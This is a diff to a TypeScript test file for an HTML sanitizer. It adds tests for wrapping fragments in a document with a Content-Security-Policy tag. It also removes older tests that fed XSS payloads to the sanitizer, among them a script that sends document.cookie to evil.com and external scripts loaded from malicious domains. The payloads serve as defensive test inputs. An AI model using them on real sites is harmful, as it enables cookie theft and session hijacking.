@@ -1,4 +1,53 @@
-import { sanitizeHtml } from './html.ts';
+import { sanitizeHtml, wrapHtmlWithCSP } from './html.ts';
+
+const TEST_CSP_POLICY =
+  "default-src 'self'; script-src 'self' 'unsafe-inline' https://*.tailwindcss.com; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; img-src 'self' data: https:; font-src 'self' https://cdn.tailwindcss.com https://fonts.gstatic.com; connect-src 'none'; frame-src 'none'; object-src 'none'; base-uri 'self'";
+
+describe('wrapHtmlWithCSP', () => {
+  it('should wrap HTML fragments in complete document with CSP meta tag', () => {
+    const html = '<div>Content</div>';
+    const result = wrapHtmlWithCSP(html, TEST_CSP_POLICY);
+
+    expect(result).toContain('<!DOCTYPE html>');
+    expect(result).toContain('<html>');
+    expect(result).toContain('<head>');
+    expect(result).toContain('<meta charset="UTF-8">');
+    expect(result).toContain('<body>');
+    expect(result).toContain('<div>Content</div>');
+  });
+
+  it('should include the exact CSP policy provided', () => {
+    const html = '<div>Content</div>';
+    const result = wrapHtmlWithCSP(html, TEST_CSP_POLICY);
+
+    // Verify the exact CSP meta tag with the provided policy
+    expect(result).toContain(
+      `<meta http-equiv="Content-Security-Policy" content="${TEST_CSP_POLICY}">`
+    );
+  });
+
+  it('should apply different CSP policies correctly', () => {
+    const html = '<div>Test</div>';
+    const strictPolicy = "default-src 'none'; script-src 'self'";
+    const result = wrapHtmlWithCSP(html, strictPolicy);
+
+    expect(result).toContain(
+      `<meta http-equiv="Content-Security-Policy" content="${strictPolicy}">`
+    );
+    expect(result).not.toContain(TEST_CSP_POLICY);
+  });
+
+  it('should handle CSP policy with special characters', () => {
+    const html = '<div>Test</div>';
+    const policyWithHash =
+      "script-src 'self' 'sha256-xyz123' https://example.com";
+    const result = wrapHtmlWithCSP(html, policyWithHash);
+
+    expect(result).toContain(
+      `<meta http-equiv="Content-Security-Policy" content="${policyWithHash}">`
+    );
+  });
+});
 
 describe('sanitizeHtml', () => {
   it('should allow Tailwind CDN script', () => {
@@ -60,63 +109,12 @@ describe('sanitizeHtml', () => {
     expect(result).toContain('brand-blue');
     expect(result).toContain('<div>Content</div>');
   });
-});
 
-it('should remove inline script with alert', () => {
-  const html = '<div>Hello</div><script>alert("hack")</script><p>World</p>';
-  const result = sanitizeHtml(html);
+  it('should not contain head or body tags', () => {
+    const html = '<div>Content</div>';
+    const result = sanitizeHtml(html);
 
-  expect(result).not.toContain('<script>');
-  expect(result).not.toContain('alert("hack")');
-  expect(result).toContain('<div>Hello</div>');
-  expect(result).toContain('<p>World</p>');
-});
-
-it('should remove script with document.cookie access', () => {
-  const html =
-    '<div>Content</div><script>document.cookie = "stolen=true"</script>';
-  const result = sanitizeHtml(html);
-
-  expect(result).not.toContain('<script>');
-  expect(result).not.toContain('document.cookie');
-  expect(result).toContain('<div>Content</div>');
-});
-
-it('should remove script with XSS payload', () => {
-  const html =
-    '<p>Normal content</p><script>window.location="http://evil.com?cookie="+document.cookie</script>';
-  const result = sanitizeHtml(html);
-
-  expect(result).not.toContain('<script>');
-  expect(result).not.toContain('evil.com');
-  expect(result).not.toContain('window.location');
-  expect(result).toContain('<p>Normal content</p>');
-});
-
-it('should remove external script from untrusted domain', () => {
-  const html =
-    '<div>Content</div><script src="https://malicious.com/script.js"></script>';
-  const result = sanitizeHtml(html);
-
-  expect(result).not.toContain('<script');
-  expect(result).not.toContain('malicious.com');
-  expect(result).toContain('<div>Content</div>');
-});
-
-it('should remove multiple malicious scripts', () => {
-  const html = `
-        <div>Safe content</div>
-        <script>alert("first hack")</script>
-        <p>More content</p>
-        <script src="https://evil.com/hack.js"></script>
-        <script>document.write("XSS")</script>
-      `;
-  const result = sanitizeHtml(html);
-
-  expect(result).not.toContain('<script');
-  expect(result).not.toContain('alert');
-  expect(result).not.toContain('evil.com');
-  expect(result).not.toContain('document.write');
-  expect(result).toContain('<div>Safe content</div>');
-  expect(result).toContain('<p>More content</p>');
+    expect(result).not.toContain('<head>');
+    expect(result).not.toContain('<body>');
+  });
 });
